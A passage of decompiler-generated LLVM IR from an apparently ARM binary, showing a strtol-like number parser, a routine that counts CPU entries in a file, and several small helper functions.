  %v2_12ad8 = inttoptr i32 %v1_12ad8 to i8*
  %v3_12ad8 = load i8, i8* %v2_12ad8, align 1
  %v4_12ad8 = zext i8 %v3_12ad8 to i32
  store i32 %v1_12ad8, i32* @r4, align 4
  %v1_12adc = or i32 %v4_12ad8, 32
  %v7_12ae0 = icmp eq i32 %v1_12adc, 120
  %v1_12ae4 = add i32 %v0_12a68, 8
  store i32 %v1_12ae4, i32* %r5.global-to-local, align 4
  store i32 %v1_12ad8, i32* %r6.global-to-local, align 4
  br i1 %v7_12ae0, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_12ad8
  %v3_12af0 = mul i32 %v1_12ae4, 2
  store i32 %v3_12af0, i32* %r5.global-to-local, align 4
  %v2_12af4 = add i32 %v0_12ad8, 2
  store i32 %v2_12af4, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12ad8, %bb53, %bb54
  %v0_12af8 = phi i32 [ %v1_12acc, %bb53 ], [ %v3_12af0, %bb54 ], [ %v1_12ae4, %dec_label_pc_12ad8 ]
  %v5_12afc = icmp slt i32 %v0_12af8, 16
  br i1 %v5_12afc, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_12b14 = phi i32 [ %v0_12a68, %bb52 ], [ %v0_12af8, %.thread8 ], [ 16, %bb55 ]
  %v1_12b00 = add i32 %v0_12b14, -2
  %tmp = icmp ugt i32 %v1_12b00, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_12b10

.thread:                                          ; preds = %bb56
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12bbc

dec_label_pc_12b10:                               ; preds = %bb56
  %v2_12b18 = call i32 @function_10778(i32 -1, i32 %v0_12b14)
  store i32 -1, i32* @r0, align 4
  %v0_12b24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12b24, i32* @r1, align 4
  %v1_12b28 = urem i32 %v0_12b14, 256
  store i32 %v1_12b28, i32* %sl.global-to-local, align 4
  %v0_12b2c = call i32 @function_1067c()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_12b2c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_12b44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12b44

dec_label_pc_12b40:                               ; preds = %bb63, %dec_label_pc_12ba0
  %v0_12b40 = phi i32 [ %v1_12b8036, %bb63 ], [ %v0_12b40.pre, %dec_label_pc_12ba0 ]
  store i32 %v0_12b40, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12b44

dec_label_pc_12b44:                               ; preds = %dec_label_pc_12b10, %dec_label_pc_12b40
  %v0_12b80 = phi i32 [ %v0_12b44.pre, %dec_label_pc_12b10 ], [ %v0_12b40, %dec_label_pc_12b40 ]
  %v1_12b44 = inttoptr i32 %v0_12b80 to i8*
  %v2_12b44 = load i8, i8* %v1_12b44, align 1
  %v3_12b44 = zext i8 %v2_12b44 to i32
  %v1_12b48 = add nsw i32 %v3_12b44, -48
  %v1_12b4c = urem i32 %v1_12b48, 256
  %v1_12b54 = or i32 %v3_12b44, 32
  %tmp71 = icmp ult i32 %v1_12b4c, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_12b5c

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b44
  %tmp72 = icmp ugt i32 %v1_12b54, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_12b5c
  %v1_12b60 = add nsw i32 %v1_12b54, -87
  %v5_12b68 = urem i32 %v1_12b60, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_12b44, %dec_label_pc_12b5c, %bb57
  %v3_12b98 = phi i32 [ %v1_12b4c, %dec_label_pc_12b44 ], [ 40, %dec_label_pc_12b5c ], [ %v5_12b68, %bb57 ]
  %v1_12b6c = load i32, i32* %r5.global-to-local, align 4
  %v6_12b70 = icmp slt i32 %v3_12b98, %v1_12b6c
  br i1 %v6_12b70, label %dec_label_pc_12b74, label %dec_label_pc_12bbc.loopexit

dec_label_pc_12b74:                               ; preds = %bb58
  %v0_12b74 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b74 = load i32, i32* %r8.global-to-local, align 4
  %v9_12b74 = icmp eq i32 %v0_12b74, %v1_12b74
  br i1 %v9_12b74, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_12b74
  %v1_12b8032 = add i32 %v0_12b80, 1
  store i32 %v1_12b8032, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b88

bb59:                                             ; preds = %dec_label_pc_12b74
  %v3_12b74 = icmp ult i32 %v0_12b74, %v1_12b74
  %v1_12b80 = add i32 %v0_12b80, 1
  store i32 %v1_12b80, i32* %r4.global-to-local, align 4
  br i1 %v3_12b74, label %dec_label_pc_12b88, label %dec_label_pc_12ba0

dec_label_pc_12b88:                               ; preds = %bb59, %.thread31
  %v1_12b8036 = phi i32 [ %v1_12b8032, %.thread31 ], [ %v1_12b80, %bb59 ]
  %v4_12b902235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_12b88 = load i32, i32* %sl.global-to-local, align 4
  %v3_12b88 = icmp uge i32 %v3_12b98, %v1_12b88
  %v9_12b88 = icmp eq i32 %v3_12b98, %v1_12b88
  %v2_12b8c = xor i1 %v3_12b88, true
  %v3_12b8c = or i1 %v9_12b88, %v2_12b8c
  br i1 %v3_12b8c, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_12b88
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_12b88, %bb60
  %v4_12b90 = phi i32 [ %v4_12b902235, %dec_label_pc_12b88 ], [ 0, %bb60 ]
  %v2_12b90 = xor i1 %v9_12b88, true
  %v3_12b90 = and i1 %v3_12b88, %v2_12b90
  br i1 %v3_12b90, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_12b90 = urem i32 %v4_12b90, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_12b94 = phi i32 [ %v5_12b90, %bb62 ], [ %v4_12b90, %bb61 ]
  %v2_12b94 = icmp eq i32 %v0_12b94, 0
  br i1 %v2_12b94, label %bb63, label %dec_label_pc_12ba0

bb63:                                             ; preds = %thread-pre-split
  %v4_12b98 = mul i32 %v0_12b74, %v1_12b6c
  %v5_12b98 = add i32 %v4_12b98, %v3_12b98
  store i32 %v5_12b98, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12b40

dec_label_pc_12ba0:                               ; preds = %bb59, %thread-pre-split
  %v0_12ba0 = call i32 @function_11008()
  %v0_12ba8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12ba8, i32* %ip.global-to-local, align 4
  %v0_12bac = load i32, i32* @r7, align 4
  %v2_12bac = and i32 %v0_12bac, %v0_12a70
  store i32 %v2_12bac, i32* @r7, align 4
  %v2_12bb4 = inttoptr i32 %v0_12ba0 to i32*
  store i32 34, i32* %v2_12bb4, align 4
  %v0_12b40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12b40

dec_label_pc_12bbc.loopexit:                      ; preds = %bb58
  %v0_12bbc.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12bbc

dec_label_pc_12bbc:                               ; preds = %.thread, %dec_label_pc_12bbc.loopexit
  %v2_12bc0 = phi i32 [ %v0_12bbc.pre, %dec_label_pc_12bbc.loopexit ], [ %v0_12a64, %.thread ]
  %v2_12bbc = icmp eq i32 %v2_12bc0, 0
  br i1 %v2_12bbc, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_12bbc
  %v1_12bc0 = load i32, i32* %r6.global-to-local, align 4
  %v3_12bc0 = inttoptr i32 %v2_12bc0 to i32*
  store i32 %v1_12bc0, i32* %v3_12bc0, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_12bbc, %bb64
  %v0_12bc8 = load i32, i32* @r7, align 4
  %v2_12bc8 = icmp eq i32 %v0_12bc8, 0
  %. = select i1 %v2_12bc8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_12bd4 = icmp eq i32 %v0_12a70, 0
  %v0_12bf8.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_12bd4, label %dec_label_pc_12bf0, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_12bf8.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_12be0, label %dec_label_pc_12bf0

dec_label_pc_12be0:                               ; preds = %bb68
  %v0_12be0 = call i32 @function_11008()
  %v2_12be8 = inttoptr i32 %v0_12be0 to i32*
  store i32 34, i32* %v2_12be8, align 4
  %v0_12bec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12bec, i32* %ip.global-to-local, align 4
  %v0_12bf0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %bb68, %bb65, %dec_label_pc_12be0
  %v0_12bf8.pre = phi i32 [ %v0_12bf8.pre.pre, %bb68 ], [ %v0_12bec, %dec_label_pc_12be0 ], [ %v0_12bf8.pre.pre, %bb65 ]
  %v0_12bf0 = phi i32 [ %v0_12bc8, %bb68 ], [ %v0_12bf0.pre, %dec_label_pc_12be0 ], [ %v0_12bc8, %bb65 ]
  %v2_12bf0 = icmp eq i32 %v0_12bf0, 0
  br i1 %v2_12bf0, label %dec_label_pc_12bf0._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_12bf0
  %v2_12bf4 = sub i32 0, %v0_12bf8.pre
  store i32 %v2_12bf4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12bf0._crit_edge

dec_label_pc_12bf0._crit_edge:                    ; preds = %dec_label_pc_12bf0, %bb69
  %v0_12bf8 = phi i32 [ %v2_12bf4, %bb69 ], [ %v0_12bf8.pre, %dec_label_pc_12bf0 ]
  store i32 %v3_12a50, i32* @r4, align 4
  store i32 %v12_12a50, i32* @r7, align 4
  ret i32 %v0_12bf8

; uselistorder directives
  uselistorder i32 %v0_12bf8.pre, { 1, 0 }
  uselistorder i32 %v0_12bf8.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_12b90, { 1, 0 }
  uselistorder i1 %v3_12b88, { 1, 0 }
  uselistorder i32 %v1_12b88, { 1, 0 }
  uselistorder i32 %v1_12b54, { 1, 0 }
  uselistorder i32 %v1_12b4c, { 1, 0 }
  uselistorder i32 %v0_12b80, { 1, 0, 2 }
  uselistorder i32 %v0_12b40, { 1, 0 }
  uselistorder i32 %v3_12af0, { 1, 0 }
  uselistorder i32 %v1_12ae4, { 1, 0, 2 }
  uselistorder i32 %v0_12ab4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12a70, { 1, 0 }
  uselistorder i32 %v0_12a68, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 ()* @function_1067c, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 (i32, i32)* @function_10778, { 3, 2, 0, 6, 1, 5, 4 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12bf0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12bf0, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_12bbc, { 1, 0 }
  uselistorder label %dec_label_pc_12ba0, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12b44, { 1, 0 }
  uselistorder label %dec_label_pc_12b40, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ab8, { 1, 0 }
  uselistorder label %dec_label_pc_12ab4, { 1, 0 }
  uselistorder label %dec_label_pc_12a7c, { 1, 0 }
}

define i32 @function_12c10(i32 %arg1) local_unnamed_addr {
dec_label_pc_12c10:
  %stack_var_-16 = alloca i32, align 4
  store i32 124088, i32* @r5, align 4
  %v4_12c1c = load i32, i32* inttoptr (i32 124176 to i32*), align 16
  store i32 %v4_12c1c, i32* @r4, align 4
  %v2_12c24 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_12c3c = load i32, i32* inttoptr (i32 124160 to i32*), align 256
  call void @__pseudo_branch(i32 %v4_12c3c)
  %v0_12c50 = load i32, i32* @r5, align 4
  %v2_12c50 = add i32 %v0_12c50, 16
  %v3_12c50 = inttoptr i32 %v2_12c50 to i32*
  %v4_12c50 = load i32, i32* %v3_12c50, align 4
  call void @__pseudo_branch(i32 %v4_12c50)
  %v4_12c60 = load i32, i32* @global_var_1e754.371, align 4
  %v2_12c64 = icmp eq i32 %v4_12c60, 0
  br i1 %v2_12c64, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12c10
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12c10, %bb
  %v2_12c70 = xor i1 %v2_12c64, true
  call void @__pseudo_cond_branch(i1 %v2_12c70, i32 %v4_12c60)
  store i32 %v2_12c24, i32* @r0, align 4
  %v0_12c80 = load i32, i32* @r5, align 4
  %v2_12c80 = add i32 %v0_12c80, 24
  %v3_12c80 = inttoptr i32 %v2_12c80 to i32*
  %v4_12c80 = load i32, i32* %v3_12c80, align 4
  call void @__pseudo_branch(i32 %v4_12c80)
  %v0_12c8c = call i32 @function_134dc()
  %v0_12c94 = load i32, i32* @r5, align 4
  %v9_12c94 = icmp eq i32 %v0_12c94, 39744
  br i1 %v9_12c94, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_12c9c = xor i1 %v9_12c94, true
  call void @__pseudo_cond_branch(i1 %v2_12c9c, i32 ptrtoint (i32* @global_var_14978.374 to i32))
  %v0_12ca0 = load i32, i32* @r6, align 4
  %v1_12ca4 = call i32 @function_13f44(i32 %v0_12ca0)
  %v0_12ca8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ca8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_12ca8 = load i32, i32* @r8, align 4
  %v2_12cbc = load i32, i32* @r2, align 4
  %v3_12cbc = mul i32 %v2_12cbc, %v4_12c80
  %v8_12cc0 = shl i32 %v1_12ca8, %v3_12cbc
  %v9_12cc0 = and i32 %v8_12cc0, %v3_12cbc
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_12cc0 = phi i32 [ %v1_12ca4, %bb9 ], [ %v9_12cc0, %bb10 ]
  ret i32 %v10_12cc0

; uselistorder directives
  uselistorder i1 %v9_12c94, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12cc8(i32 %arg1) local_unnamed_addr {
dec_label_pc_12cc8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_12cc8 = load i32, i32* @r4, align 4
  %v6_12cc8 = load i32, i32* @lr, align 4
  %v2_12ccc = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_12ccc, label %dec_label_pc_12d60, label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12cc8
  %v2_12cec = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_12d00 = call i32 @function_13954(i32 17, i32 0, i32 %v2_12cec)
  %v3_12d04 = load i32, i32* %stack_var_-44, align 4
  %v7_12d08 = icmp eq i32 %v3_12d04, 1
  br i1 %v7_12d08, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12cdc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12cdc, %bb
  call void @__pseudo_cond_branch(i1 %v7_12d08, i32 ptrtoint (i32* @global_var_10ba8.376 to i32))
  %v2_12d1c = ptrtoint i32* %stack_var_-16 to i32
  %v2_12d24 = call i32 @function_13e88(i32 %v2_12d1c, i32 %v2_12d1c)
  %v2_12d28 = icmp eq i32 %v2_12d24, 0
  br i1 %v2_12d28, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_12d3c = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_12d3c, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_12d4c = load i32, i32* %stack_var_-24, align 4
  %v1_12d50 = and i32 %v3_12d4c, 65536
  %v2_12d50 = icmp eq i32 %v1_12d50, 0
  br i1 %v2_12d50, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_12d50, i32 ptrtoint (i32* @global_var_10ba8.376 to i32))
  %v0_12d60.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %dec_label_pc_12cc8, %.thread6
  %v0_12d60 = phi i32 [ %v0_12d60.pre, %.thread6 ], [ 0, %dec_label_pc_12cc8 ]
  store i32 %v3_12cc8, i32* @r4, align 4
  store i32 %v6_12cc8, i32* @lr, align 4
  ret i32 %v0_12d60

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_13954, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12d60, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12d74() local_unnamed_addr {
dec_label_pc_12d74:
  %stack_var_-36 = alloca i32, align 4
  store i32 124088, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1613c.380 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_12d94 = call i32 @function_143b8(i32 ptrtoint ([11 x i8]* @global_var_1613c.380 to i32))
  store i32 %v2_12d94, i32* @r6, align 4
  %v2_12d98 = icmp eq i32 %v2_12d94, 0
  br i1 %v2_12d98, label %dec_label_pc_12e18, label %dec_label_pc_12da0

dec_label_pc_12da0:                               ; preds = %dec_label_pc_12d74
  store i32 224, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_16148.383 to i32), i32* @r8, align 4
  %v2_12dac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12dac, i32* @r7, align 4
  br label %bb18

dec_label_pc_12db4:                               ; preds = %bb18
  %v3_12db4 = load i32, i32* %stack_var_-36, align 4
  %v1_12db8 = inttoptr i32 %v3_12db4 to i32*
  %v2_12db8 = load i32, i32* %v1_12db8, align 4
  %v1_12dbc = inttoptr i32 %v2_12db8 to i8*
  %v2_12dbc = load i8, i8* %v1_12dbc, align 1
  %v7_12dc0 = icmp eq i8 %v2_12dbc, 99
  br i1 %v7_12dc0, label %dec_label_pc_12dc8, label %.backedge3

dec_label_pc_12dc8:                               ; preds = %dec_label_pc_12db4
  %v1_12dc8 = add i32 %v2_12db8, 1
  %v2_12dc8 = inttoptr i32 %v1_12dc8 to i8*
  %v3_12dc8 = load i8, i8* %v2_12dc8, align 1
  %v7_12dcc = icmp eq i8 %v3_12dc8, 112
  br i1 %v7_12dcc, label %dec_label_pc_12dd4, label %.backedge3

dec_label_pc_12dd4:                               ; preds = %dec_label_pc_12dc8
  %v1_12dd4 = add i32 %v2_12db8, 2
  %v2_12dd4 = inttoptr i32 %v1_12dd4 to i8*
  %v3_12dd4 = load i8, i8* %v2_12dd4, align 1
  %v7_12dd8 = icmp eq i8 %v3_12dd4, 117
  br i1 %v7_12dd8, label %dec_label_pc_12de0, label %.backedge3

dec_label_pc_12de0:                               ; preds = %dec_label_pc_12dd4
  %v1_12de0 = add i32 %v2_12db8, 3
  %v2_12de0 = inttoptr i32 %v1_12de0 to i8*
  %v3_12de0 = load i8, i8* %v2_12de0, align 1
  %v4_12de0 = zext i8 %v3_12de0 to i32
  %v0_12de4 = load i32, i32* @r4, align 4
  %v1_12de4 = load i32, i32* @sl, align 4
  %v2_12de4 = add i32 %v1_12de4, %v0_12de4
  %v3_12de4 = inttoptr i32 %v2_12de4 to i32*
  %v4_12de4 = load i32, i32* %v3_12de4, align 4
  %v2_12de8 = mul nuw nsw i32 %v4_12de0, 2
  %v2_12dec = add i32 %v4_12de4, %v2_12de8
  %v3_12dec = inttoptr i32 %v2_12dec to i16*
  %v4_12dec = load i16, i16* %v3_12dec, align 2
  %v1_12df0 = and i16 %v4_12dec, 8
  %v2_12df0 = icmp eq i16 %v1_12df0, 0
  br i1 %v2_12df0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_12de0
  %v1_12df4 = load i32, i32* @r5, align 4
  %v2_12df4 = add i32 %v1_12df4, 1
  store i32 %v2_12df4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_12de0, %dec_label_pc_12db4, %dec_label_pc_12dc8, %dec_label_pc_12dd4
  %v0_12df8.pre = load i32, i32* @r6, align 4
  %v0_12e04.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_12da0
  %v0_12e04 = phi i32 [ %v0_12e04.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_16148.383 to i32), %dec_label_pc_12da0 ]
  %v0_12df8 = phi i32 [ %v0_12df8.pre, %.backedge3 ], [ %v2_12d94, %dec_label_pc_12da0 ]
  %v4_12e08 = inttoptr i32 %v0_12df8 to i32*
  %v5_12e08 = call i32 @function_1405c(i32* %v4_12e08, i32 %v2_12dac, i32 258, i32 %v0_12e04)
  %v2_12e0c = icmp eq i32 %v5_12e08, 0
  br i1 %v2_12e0c, label %dec_label_pc_12e7c, label %dec_label_pc_12db4

dec_label_pc_12e18:                               ; preds = %dec_label_pc_12d74
  store i32 ptrtoint ([14 x i8]* @global_var_1614c.386 to i32), i32* @r0, align 4
  %v2_12e20 = call i32 @function_143b8(i32 ptrtoint ([14 x i8]* @global_var_1614c.386 to i32))
  store i32 %v2_12e20, i32* @r6, align 4
  %v2_12e24 = icmp eq i32 %v2_12e20, 0
  br i1 %v2_12e24, label %bb19, label %dec_label_pc_12e30

bb19:                                             ; preds = %dec_label_pc_12e18
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12e7c

dec_label_pc_12e30:                               ; preds = %dec_label_pc_12e18
  store i32 ptrtoint ([10 x i8]* @global_var_1615c.388 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_16180.390 to i32), i32* @r7, align 4
  %v2_12e40 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12e40, i32* @r4, align 4
  br label %bb21

dec_label_pc_12e48:                               ; preds = %bb21
  %v0_12e74 = load i32, i32* @r8, align 4
  %v1_12e74 = inttoptr i32 %v0_12e74 to i8*
  %v3_12e48 = load i32, i32* %stack_var_-36, align 4
  %v1_12e4c = inttoptr i32 %v3_12e48 to i32*
  %v2_12e4c = load i32, i32* %v1_12e4c, align 4
  store i32 %v2_12e4c, i32* @r1, align 4
  %v4_12e50 = call i32 @function_15670(i8* %v1_12e74, i32 %v2_12e4c)
  %v2_12e54 = icmp eq i32 %v4_12e50, 0
  br i1 %v2_12e54, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_12e48
  %v1_12e58 = load i32, i32* @r5, align 4
  %v2_12e58 = add i32 %v1_12e58, 1
  store i32 %v2_12e58, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_12e48
  %v0_12e64.pre = load i32, i32* @r7, align 4
  %v0_12e68.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_12e30
  %v0_12e68 = phi i32 [ %v0_12e68.pre, %.backedge ], [ %v2_12e20, %dec_label_pc_12e30 ]
  %v0_12e64 = phi i32 [ %v0_12e64.pre, %.backedge ], [ ptrtoint (i32* @global_var_16180.390 to i32), %dec_label_pc_12e30 ]
  %v4_12e6c = inttoptr i32 %v0_12e68 to i32*
  %v5_12e6c = call i32 @function_1405c(i32* %v4_12e6c, i32 %v2_12e40, i32 459266, i32 %v0_12e64)
  %v2_12e70 = icmp eq i32 %v5_12e6c, 0
  br i1 %v2_12e70, label %dec_label_pc_12e7c, label %dec_label_pc_12e48

dec_label_pc_12e7c:                               ; preds = %bb18, %bb21, %bb19
  %v0_12e7c = load i32, i32* @r6, align 4
  %v1_12e80 = inttoptr i32 %v0_12e7c to i32*
  %v2_12e80 = call i32 @function_14384(i32* %v1_12e80)
  %v0_12e84 = load i32, i32* @r5, align 4
  %v2_12e84 = icmp eq i32 %v0_12e84, 0
  %.v0_12e84 = select i1 %v2_12e84, i32 1, i32 %v0_12e84
  ret i32 %.v0_12e84

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @function_143b8, { 1, 0 }
  uselistorder label %dec_label_pc_12e7c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_12ec0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12ec0:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_132a8

bb:                                               ; preds = %dec_label_pc_12ec0
  %v7_12ed4 = mul i32 %arg1, 4
  %v8_12ed4 = add i32 %v7_12ed4, ptrtoint (i32* @global_var_12edc.393 to i32)
  call void @__pseudo_branch(i32 %v8_12ed4)
  br label %dec_label_pc_132a8

dec_label_pc_132a8:                               ; preds = %bb, %dec_label_pc_12ec0
  %v0_132a8 = call i32 @function_11008()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_132b4 = inttoptr i32 %v0_132a8 to i32*
  store i32 22, i32* %v2_132b4, align 4
  %v0_13464 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_13464

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_134dc() local_unnamed_addr {
dec_label_pc_13500.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_134dc = load i32, i32* @r4, align 4
  store i32 %v3_134dc, i32* %stack_var_-16, align 4
  store i32 124080, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %dec_label_pc_13500.dec_label_pc_13500_crit_edge, %dec_label_pc_13500.lr.ph
  %v1_13500 = phi i32 [ %v1_1350c, %dec_label_pc_13500.dec_label_pc_13500_crit_edge ], [ 0, %dec_label_pc_13500.lr.ph ]
  %v0_13500 = phi i32 [ %v0_13500.pre, %dec_label_pc_13500.dec_label_pc_13500_crit_edge ], [ 124080, %dec_label_pc_13500.lr.ph ]
  %v4_13500 = mul i32 %v1_13500, 4
  %v5_13500 = add i32 %v4_13500, %v0_13500
  %v6_13500 = inttoptr i32 %v5_13500 to i32*
  %v7_13500 = load i32, i32* %v6_13500, align 4
  call void @__pseudo_branch(i32 %v7_13500)
  %v0_1350c = load i32, i32* %r4.global-to-local, align 4
  %v1_1350c = add i32 %v0_1350c, -1
  store i32 %v1_1350c, i32* %r4.global-to-local, align 4
  %v2_1350c = icmp eq i32 %v0_1350c, 0
  br i1 %v2_1350c, label %dec_label_pc_13514, label %dec_label_pc_13500.dec_label_pc_13500_crit_edge

dec_label_pc_13500.dec_label_pc_13500_crit_edge:  ; preds = %dec_label_pc_13500
  %v0_13500.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13500

dec_label_pc_13514:                               ; preds = %dec_label_pc_13500
  %v4_13518 = load i32, i32* @global_var_1e764.406, align 4
  %v2_1351c = icmp eq i32 %v4_13518, 0
  br i1 %v2_1351c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_13514
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_13514, %bb
  %v2_13524 = xor i1 %v2_1351c, true
  call void @__pseudo_cond_branch(i1 %v2_13524, i32 %v4_13518)
  %v4_1352c = load i32, i32* @global_var_1e768.408, align 4
  %v2_13530 = icmp eq i32 %v4_1352c, 0
  br i1 %v2_13530, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_13538 = xor i1 %v2_13530, true
  call void @__pseudo_cond_branch(i1 %v2_13538, i32 %v4_1352c)
  %v2_1353c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1353c, i32* %r4.global-to-local, align 4
  %v1_13540 = load i32, i32* @r0, align 4
  ret i32 %v1_13540

; uselistorder directives
